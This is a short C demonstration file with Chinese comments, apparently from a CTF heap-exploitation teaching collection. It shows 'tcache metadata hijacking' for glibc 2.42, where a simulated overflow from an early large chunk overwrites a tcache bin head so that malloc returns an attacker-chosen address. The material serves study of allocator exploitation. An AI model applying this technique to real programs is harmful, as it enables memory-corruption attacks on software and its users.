/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_metadata_hijacking
 * 文件标注范围：2.42
 * 模拟漏洞：在 tcache 完成延迟初始化之前先分配一个大块，并具备从这个大块向后溢出、
 *   覆盖到随后才创建出来的 tcache 元数据的能力。
 * 核心流程：2.42 起，部分非 tcache 分配路径不再一律先执行 MAYBE_INIT_TCACHE，这就让
 *   tcache_perthread_struct 有机会落在我们控制的 chunk 之后，溢出因此能直接命中它。
 * 成功判据：覆盖 entries 表头之后，下一次同尺寸申请应返回 target；2.43 由于结构体
 *   字段和 TLS 哨兵的变化，目标索引与本文件不同。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	// 关闭标准流缓冲，避免 _IO_FILE 内部的隐式分配打乱本例依赖的堆布局。
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// 背景说明：2.42 起，tcache 的管理结构不再保证在第一次大块申请之前就完成初始化。

	long target[0x4] __attribute__ ((aligned (0x10)));

	long *chunk = malloc(0x420);

	void *p1 = malloc(0x10);
	free(p1);

	/* 漏洞模拟开始：用一次堆溢出覆盖 tcache entries 中目标尺寸桶对应的表头。 */
	chunk[0x420/8+21] = (long)&target[0];
	/* 漏洞模拟结束：下一次申请同等尺寸的 chunk 时，就会取用这个被替换过的表头。 */

	void *p2 = malloc(0x10);

	assert(p2 == &target[0]);
}
